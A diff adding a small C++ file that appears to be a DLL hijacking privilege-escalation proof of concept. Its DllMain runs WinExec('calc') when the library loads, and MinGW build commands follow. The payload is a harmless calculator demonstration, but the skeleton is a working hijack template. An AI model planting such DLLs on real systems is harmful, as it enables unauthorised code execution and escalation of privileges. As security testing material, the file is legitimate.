@@ -1,0 +1,20 @@
+//https://www.gracefulsecurity.com/privesc-dll-hijacking/
+
+#include <windows.h>
+int fireLazor()
+{
+ WinExec("calc", 0);
+ return 0;
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
+{
+ fireLazor();
+ return 0;
+}
+
+//compile with 
+/*
+i686-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
+i686-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a
+*/
